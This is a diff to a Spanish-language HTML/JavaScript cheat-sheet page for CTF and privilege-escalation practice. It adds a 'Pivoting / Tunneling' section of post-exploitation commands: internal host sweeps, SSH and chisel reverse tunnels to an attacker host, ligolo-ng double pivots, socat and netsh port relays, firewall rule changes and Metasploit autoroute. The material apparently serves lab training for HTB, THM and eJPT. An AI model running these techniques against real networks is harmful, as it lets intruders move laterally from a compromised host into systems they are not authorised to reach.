@@ -29,7 +29,7 @@
   }
   header h1 span{color:var(--magenta); text-shadow:0 0 14px rgba(255,77,216,.35);}
   header p{margin:6px 0 0; color:var(--dim); font-size:.85rem;}
-
+ 
   .search-wrap{max-width:720px; margin:22px auto 0; padding:0 20px;}
   #q{
     width:100%; padding:12px 14px; background:var(--panel);
@@ -38,7 +38,7 @@
   }
   #q:focus{border-color:var(--cyan); box-shadow:0 0 0 1px var(--cyan);}
   #q::placeholder{color:var(--dim);}
-
+ 
   nav{
     max-width:900px; margin:16px auto 0; padding:0 20px;
     display:flex; gap:10px; flex-wrap:wrap; justify-content:center;
@@ -49,9 +49,9 @@
     border-radius:3px; cursor:pointer; letter-spacing:.03em;
   }
   nav button.active{color:var(--bg); background:var(--cyan); border-color:var(--cyan);}
-
+ 
   main{max-width:900px; margin:24px auto 60px; padding:0 20px;}
-
+ 
   .sheet{margin-bottom:10px;}
   .sheet-title{
     font-size:1.05rem; color:var(--magenta); margin:34px 0 4px;
@@ -71,7 +71,7 @@
   .sect.open .car{transform:rotate(90deg);}
   .sect-body{display:none; padding:0 14px 14px;}
   .sect.open .sect-body{display:block;}
-
+ 
   .block{margin:12px 0;}
   .block p{margin:0 0 6px; color:var(--dim); font-size:.82rem;}
   pre{
@@ -87,7 +87,7 @@
   }
   .copy-btn:hover{color:var(--cyan);}
   .copy-btn.done{color:var(--cyan); border:1px solid var(--cyan);}
-
+ 
   mark{background:rgba(255,77,216,.3); color:#fff; border-radius:2px;}
   .empty{text-align:center; color:var(--dim); margin-top:60px; font-size:.9rem;}
   footer{text-align:center; color:var(--dim); font-size:.72rem; padding:20px; border-top:1px solid var(--border);}
@@ -95,22 +95,22 @@
 </style>
 </head>
 <body>
-
+ 
 <header>
   <h1>juani<span>@</span>cheatsheets</h1>
   <p>comandos de referencia — escalado de privilegios &amp; captura de flags</p>
 </header>
-
+ 
 <div class="search-wrap">
   <input id="q" type="text" placeholder="buscar comando, técnica, binario... (ej: sudo, SUID, JuicyPotato)">
 </div>
-
+ 
 <nav id="filters"></nav>
-
+ 
 <main id="main"></main>
-
+ 
 <footer>github.com/Juanizxcvbn · generado para consulta rápida offline</footer>
-
+ 
 <script>
 const DATA = [
   {
@@ -453,6 +453,59 @@ const DATA = [
     ]
   },
   {
+    id:"pivoting", title:"\U0001F500 Pivoting / Tunneling",
+    sections:[
+      {h:"Detectar una red interna (desde el pivot)", blocks:[
+        {p:"Ver interfaces y rutas del host comprometido", code:`ip a\nifconfig\nip route\nroute -n\nnetstat -rn\narp -a`},
+        {p:"Descubrir hosts vivos en la red interna (sin nmap en el pivot)", code:`for i in $(seq 1 254); do ping -c1 -W1 172.16.0.$i | grep "bytes from"; done\n# PowerShell\n1..254 | % { Test-Connection -Count 1 -Quiet 172.16.0.$_ }`}
+      ]},
+      {h:"SSH Port Forwarding", blocks:[
+        {p:"Local forward: traes un puerto interno a tu Kali (local:4444 -> interna:3306)", code:`ssh -L 4444:172.16.0.5:3306 usuario@<IP_pivote> -N`},
+        {p:"Remote forward: expones un puerto tuyo en el pivot (util para reverse shells)", code:`ssh -R 8080:127.0.0.1:80 usuario@<IP_pivote> -N`},
+        {p:"Dynamic (SOCKS proxy): el mas usado, abre un SOCKS dinamico", code:`ssh -D 1080 usuario@<IP_pivote> -N\n# luego salis por proxychains`}
+      ]},
+      {h:"proxychains", blocks:[
+        {p:"Config: /etc/proxychains4.conf (deja solo esta linea al final)", code:`socks5 127.0.0.1 1080\n# (socks4 127.0.0.1 1080 si el proxy es SOCKS4, ej. Metasploit)`},
+        {p:"Usar cualquier herramienta a traves del tunel", code:`proxychains nmap -sT -Pn -p 445,3389 172.16.0.5\nproxychains crackmapexec smb 172.16.0.5\nproxychains xfreerdp /u:admin /v:172.16.0.5`},
+        {p:"A traves de SOCKS usa siempre -sT -Pn en nmap (el SYN scan no funciona)", code:`proxychains nmap -sT -Pn 172.16.0.5`}
+      ]},
+      {h:"chisel (cuando no hay SSH)", blocks:[
+        {p:"Atacante (servidor)", code:`./chisel server -p 8000 --reverse`},
+        {p:"Pivot (cliente) - arma un SOCKS reverso en el atacante", code:`./chisel client <IP_atacante>:8000 R:socks\n# abre socks5 en 127.0.0.1:1080 del atacante`},
+        {p:"Port forward puntual en vez de SOCKS", code:`./chisel client <IP_atacante>:8000 R:4444:172.16.0.5:3306`}
+      ]},
+      {h:"ligolo-ng (el mas comodo hoy)", blocks:[
+        {p:"Atacante: crear la interfaz tun y levantar el proxy", code:`sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert`},
+        {p:"Pivot: conectar el agent al atacante", code:`./agent -connect <IP_atacante>:11601 -ignore-cert`},
+        {p:"En la consola de ligolo: activar la sesion y ver sus redes", code:`session\nifconfig`},
+        {p:"Atacante (otra terminal): agregar la ruta a la red interna", code:`sudo ip route add 172.16.0.0/24 dev ligolo\n# ahora llegas a la red interna como si fuera local, sin proxychains`},
+        {p:"En la consola de ligolo: arrancar el tunel", code:`start`}
+      ]},
+      {h:"ligolo-ng - doble pivot (red detras de otra red)", blocks:[
+        {p:"Objetivo: pivot1 ve la red A, y dentro de A hay un pivot2 que ve la red B", code:`# 1) pivot1 conectado como siempre (agent -> atacante), ruta a red A agregada`},
+        {p:"Atacante: crear un listener en el agent de pivot1 que reenvie al atacante", code:`# en la consola de ligolo, con la sesion de pivot1 activa:\nlistener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`},
+        {p:"Subir el agent a pivot2 y conectarlo al listener de pivot1 (no al atacante)", code:`./agent -connect <IP_pivot1_en_redA>:11601 -ignore-cert`},
+        {p:"Atacante: segunda interfaz tun para la red B y su ruta", code:`sudo ip tuntap add user $(whoami) mode tun ligolo2\nsudo ip link set ligolo2 up\n# activas la sesion de pivot2 en ligolo y:\nsudo ip route add 172.16.1.0/24 dev ligolo2`}
+      ]},
+      {h:"sshuttle (VPN pobre sobre SSH)", blocks:[
+        {p:"Rutea toda una subred por el pivot, sin proxychains (necesita Python en el pivot)", code:`sshuttle -r usuario@<IP_pivote> 172.16.0.0/24\nsshuttle -r usuario@<IP_pivote> 0.0.0.0/0   # todo el trafico`}
+      ]},
+      {h:"socat (relay de puertos)", blocks:[
+        {p:"Reenviar un puerto local del pivot hacia un host interno", code:`socat TCP-LISTEN:4444,fork,reuseaddr TCP:172.16.0.5:3389`}
+      ]},
+      {h:"Windows como pivot", blocks:[
+        {p:"netsh portproxy - redirigir un puerto (nativo, sin subir binarios)", code:`netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.0.5\nnetsh interface portproxy show all\n# borrar la regla\nnetsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0`},
+        {p:"plink.exe - SSH dynamic forward desde Windows", code:`plink.exe -D 1080 usuario@<IP_atacante>`},
+        {p:"Abrir el puerto en el firewall si hace falta", code:`netsh advfirewall firewall add rule name="pivot" dir=in action=allow protocol=TCP localport=4444`}
+      ]},
+      {h:"Metasploit (autoroute + socks + portfwd)", blocks:[
+        {p:"autoroute - rutear a la red interna a traves de la sesion meterpreter", code:`# dentro de meterpreter\nrun autoroute -s 172.16.0.0/24\nbackground\nroute add 172.16.0.0 255.255.255.0 <session_id>`},
+        {p:"socks_proxy - exponer la ruta a herramientas externas via proxychains", code:`use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 4a\nrun -j\n# en /etc/proxychains4.conf: socks4 127.0.0.1 1080`},
+        {p:"portfwd - redirigir un puerto remoto a tu maquina", code:`# dentro de meterpreter\nportfwd add -l 3389 -p 3389 -r 172.16.0.5\nportfwd list`}
+      ]}
+    ]
+  },
+  {
     id:"flags", title:"🚩 Buscar Flags (HTB / THM)", 
     sections:[
       {h:"Ubicaciones típicas", blocks:[
@@ -554,15 +607,15 @@ proxychains nmap -sT -Pn <IP_interna>`},
 portfwd add -l <puerto_local> -p <puerto_remoto> -r <IP_interna>`},
         {p:"chisel — pivoting sin Metasploit (muy usado en eJPT)", code:`# atacante (servidor)
 ./chisel server -p 8000 --reverse
-
+ 
 # víctima (cliente) — abre un SOCKS en el atacante
 ./chisel client <IP_atacante>:8000 R:socks
-
+ 
 # luego en el atacante
 proxychains nmap -sT -Pn <IP_interna>`},
         {p:"SSH — pivoting con tunneling (si tenés creds SSH en el host comprometido)", code:`# port forwarding local
 ssh -L <puerto_local>:<IP_interna>:<puerto_destino> usuario@<IP_pivote>
-
+ 
 # SOCKS proxy dinámico vía SSH
 ssh -D 1080 usuario@<IP_pivote>
 proxychains nmap -sT -Pn <IP_interna>`}
@@ -610,30 +663,30 @@ rdesktop <IP> -u <usuario> -p <pass>`},
     ]
   }
 ];
-
+ 
 const main = document.getElementById('main');
 const filters = document.getElementById('filters');
 const q = document.getElementById('q');
-
+ 
 function esc(s){return s.replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
 function hl(s, term){
   if(!term) return esc(s);
   const re = new RegExp('('+term.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','ig');
   return esc(s).replace(re, '<mark>$1</mark>');
 }
-
+ 
 let activeSheet = 'all';
-
+ 
 filters.innerHTML = '<button data-id="all" class="active">todos</button>' +
   DATA.map(s=>`<button data-id="${s.id}">${s.title.replace(/^\S+\s/,'')}</button>`).join('');
-
+ 
 filters.addEventListener('click', e=>{
   if(e.target.tagName!=='BUTTON') return;
   activeSheet = e.target.dataset.id;
   [...filters.children].forEach(b=>b.classList.toggle('active', b===e.target));
   render();
 });
-
+ 
 function render(){
   const term = q.value.trim();
   // mientras hay texto en el buscador, ignoramos la pestaña de categoría
@@ -643,7 +696,7 @@ function render(){
     : DATA.filter(s => activeSheet==='all' || s.id===activeSheet);
   let html = '';
   let any = false;
-
+ 
   sheets.forEach(sheet=>{
     const secs = sheet.sections.map(sec=>{
       const blocks = sec.blocks.filter(b=>{
@@ -655,7 +708,7 @@ function render(){
       if(!blocks.length) return '';
       return {sec, blocks};
     }).filter(Boolean);
-
+ 
     if(!secs.length) return;
     any = true;
     html += `<div class="sheet"><div class="sheet-title">${sheet.title}</div>`;
@@ -671,10 +724,10 @@ function render(){
     });
     html += `</div>`;
   });
-
+ 
   main.innerHTML = any ? html : '<p class="empty">sin resultados — probá otro término</p>';
 }
-
+ 
 function copyCode(btn){
   const code = btn.nextElementSibling.innerText;
   navigator.clipboard.writeText(code).then(()=>{
@@ -682,7 +735,7 @@ function copyCode(btn){
     setTimeout(()=>{btn.textContent='copy'; btn.classList.remove('done');}, 1200);
   });
 }
-
+ 
 q.addEventListener('input', ()=>{
   // feedback visual: mientras se busca, marcamos "todos" como activo
   // (la categoría real vuelve a aplicarse solo si se borra la búsqueda)
